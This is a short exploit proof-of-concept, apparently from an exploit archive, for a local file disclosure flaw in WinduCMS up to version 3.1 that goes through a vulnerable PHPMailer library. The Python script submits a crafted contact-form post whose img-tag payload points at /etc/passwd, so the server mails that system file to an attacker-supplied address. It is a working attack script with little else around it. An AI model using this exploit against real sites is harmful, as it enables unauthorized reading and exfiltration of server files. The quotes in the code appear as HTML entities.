#
# Exploit Title: WinduCMS <= 3.1 - Local File Disclosure
# Date: 2017-12-03
# Exploit Author: Maciek Krupa
# Vendor Homepage: http://windu.org
# Version: 3.1
# Tested on: Linux Debian 9
#
# // Description //
#   
# Local File Disclosure vulnerability exists in WinduCMS through a vulnerable PHPMailer version 5.2.1 used here
# 
# // PoC //
#
#
# Example: {{W name=contactForm inputs="name" email="root@localhost"}}
#

from requests_toolbelt import MultipartEncoder
import requests

print("WinduCMS <= 3.1 Exploit")
 
url = &#039;http://localhost/contact_page?mn=contactform.message.negative&#039;
email = &#039;attacker@example.com&#039;
payload = &#039;<img src="/etc/passwd"&#039;
form_input = &#039;name&#039;
fields = {&#039;form_key&#039;: &#039;contactForm&#039;, form_input: &#039;Attacker&#039;, &#039;email&#039;: email, &#039;content&#039;: payload}
m = MultipartEncoder(fields=fields, boundary=&#039;----WebKitFormBoundary1500777958139315&#039;)
headers={&#039;User-Agent&#039;: &#039;Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0&#039;, &#039;Content-Type&#039;: m.content_type}
print(&#039;Sending payload to target...&#039;)
r = requests.post(url, data=m.to_string(), headers=headers)
if r.status_code == 200:
  print(&#039;Exploited.&#039;)

